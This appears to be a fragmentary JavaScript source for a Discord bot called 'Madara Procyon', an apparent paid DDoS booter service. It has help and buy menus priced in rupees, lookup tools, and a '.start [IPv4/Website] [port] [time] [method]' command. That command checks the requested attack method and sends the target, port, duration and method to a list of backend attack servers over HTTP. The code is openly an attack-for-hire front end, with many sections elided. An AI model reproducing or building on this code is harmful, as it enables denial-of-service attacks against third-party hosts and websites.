...
bot.user.setPresence({
    game: {
        name: `Madara Procyon`,
        type: "ATTACKING",
        url: "https://giffiles.alphacoders.com/174/1744.gif"
      }
    }
  );
});
...
if (command === 'help') {
  ...
  const response = new Discord.RichEmbed()
    .setColor("#8b1e9b")
    .setAuthor(`Welcome to the new version of Procyon`,"","")
    .setTitle(":flag_in:     Madara • Procyon      :flag_in:")
    .setDescription("Madara • Procyon III ")
    .setThumbnail((thumbnails[Math.floor(Math.random() * thumbnails.length)]))
    .addField(" INFO ", "```yaml\n.buy\n.botinfo\n.userinfo```", true)
    .addField(" Methods ", "```http\n.methods\n.methods-l7```", true)
    .addField(" Tools ", "```ini\n.lookup  [host]\n.resolve [host]```\n", true)
    .addField(" __Attack Commands__**", "```ini\n.start [IPv4/Website] [port] [time] [method]```", true)
    .setTimestamp()
...
if (command === 'buy') {
  ...
  const privbuyembed = new Discord.RichEmbed()
    ...
    .addField("```PRICE```", "```http\n2500 Rs\n5000 Rs\n7500 Rs\n10000 Rs\n15000 Rs\n```", true)
    .addField("```METHODS```", "**UPI/CARD/BANK**")
...
if (args < 1) {
  const response = new Discord.RichEmbed()
    .setColor('#000')
    .setThumbnail(`${msg.author.displayAvatarURL}`)
    .setAuthor(`:flag_in: Madara • Procyon :flag_in:`)
    ...
    .setTimestamp()
    .setFooter(`${msg.author.username} - :Madara • Procyon`, `${msg.author.displayAvatarURL}`);
...
//  
  const lookembed = new Discord.RichEmbed()
    .setColor("#ff0000")
    .setTitle(":flag_in: ERROR LOG :flag_in:")
    .setThumbnail(`${msg.author.displayAvatarURL}`)
...
//
   response = new Discord.RichEmbed()
    .setColor("#249c2b")
    .setTitle(":flag_in: - Host Lookup Tool - :flag_in:")
    .setDescription("Host Info")
  ...
  console.log(yellow + "[" + moment.tz("America/Sao_Paulo").format('HH:mm A') + "] " + red + `[✘]` + reset + ` ${msg.author.username} - Status: ` + red + `BlackList ` + reset + `Host: ` + green + args[0] + reset + ` Network: ` + purple + `PAID`)
    ...
    if (!metodos2.includes(args[3].toUpperCase())) {
      ...
      const metodoembed = new Discord.RichEmbed()
        ...
        .setThumbnail(`${msg.author.displayAvatarURL}`)
        .addField("**__Error__**", "The method you requested was not found in the ProcyonNetwork database, use: `.methods` to check the available methods.", true)
        .addField("**__Host__**", "**" + args[0] + "**", true)
        .setTimestamp()
        .setFooter(`${msg.author.username}`, `${msg.author.displayAvatarURL}`);
      return msg.channel.send(metodoembed);
    ...
    for (var i = 0; i < server.length; i++) {
        axios.get(format(server[i], target, port, time, method.toUpperCase())).catch(error => {
            ...
            const embed1 = new Discord.RichEmbed()
              ...
              .setTimestamp()
              .setFooter("Server Down - Procyon Network");
...
// IMPORTANT: THIS DATA (in up line) DONT WORK IN WEBSITES!!!!!
    ...
    const embed2 = new Discord.RichEmbed()
      ...
      .setTitle("```[🔥] Procyon-Network V3 - Attack [🔥]```")
      .setColor("#8b1e9b")
